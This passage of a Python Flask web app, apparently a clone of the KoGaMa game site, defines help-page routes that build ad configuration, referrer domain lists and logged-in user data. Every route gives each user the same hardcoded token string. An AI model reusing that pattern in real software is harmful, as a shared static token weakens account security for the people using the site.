                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
        }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    submenu_data = [{'url': '/help/support/', 'title': 'Support', 'key': 'support'}, {'url': '/help/privacy-policy/', 'title': 'Privacy Policy', 'key': 'privacy'}, {'url': '/help/terms-and-conditions/', 'title': 'Terms &amp; Conditions', 'key': 'terms_and_conditions'}, {'url': '/help/cookies/', 'title': 'Cookies', 'key': 'cookies'}, {'url': '/help/publishing/', 'title': 'KaGaMa Publishing', 'key': 'publishing'}]
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data=submenu_data, object_data=object_data), 200

@app.route('/help/privacy-policy/')
def help_for_privacy_policy():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    submenu_data = [{'url': '/help/support/', 'title': 'Support', 'key': 'support'}, {'url': '/help/privacy-policy/', 'title': 'Privacy Policy', 'key': 'privacy'}, {'url': '/help/terms-and-conditions/', 'title': 'Terms &amp; Conditions', 'key': 'terms_and_conditions'}, {'url': '/help/cookies/', 'title': 'Cookies', 'key': 'cookies'}, {'url': '/help/publishing/', 'title': 'KaGaMa Publishing', 'key': 'publishing'}]
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data=submenu_data, object_data=object_data), 200

@app.route('/help/terms-and-conditions/')
def help_for_terms_and_conditions():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    submenu_data = [{'url': '/help/support/', 'title': 'Support', 'key': 'support'}, {'url': '/help/privacy-policy/', 'title': 'Privacy Policy', 'key': 'privacy'}, {'url': '/help/terms-and-conditions/', 'title': 'Terms &amp; Conditions', 'key': 'terms_and_conditions'}, {'url': '/help/cookies/', 'title': 'Cookies', 'key': 'cookies'}, {'url': '/help/publishing/', 'title': 'KaGaMa Publishing', 'key': 'publishing'}]
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data=submenu_data, object_data=object_data), 200

@app.route('/help/cookies/')
def help_for_cookies():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    submenu_data = [{'url': '/help/support/', 'title': 'Support', 'key': 'support'}, {'url': '/help/privacy-policy/', 'title': 'Privacy Policy', 'key': 'privacy'}, {'url': '/help/terms-and-conditions/', 'title': 'Terms &amp; Conditions', 'key': 'terms_and_conditions'}, {'url': '/help/cookies/', 'title': 'Cookies', 'key': 'cookies'}, {'url': '/help/publishing/', 'title': 'KaGaMa Publishing', 'key': 'publishing'}]
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data=submenu_data, object_data=object_data), 200

@app.route('/help/publishing/')
def help_for_publishing():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
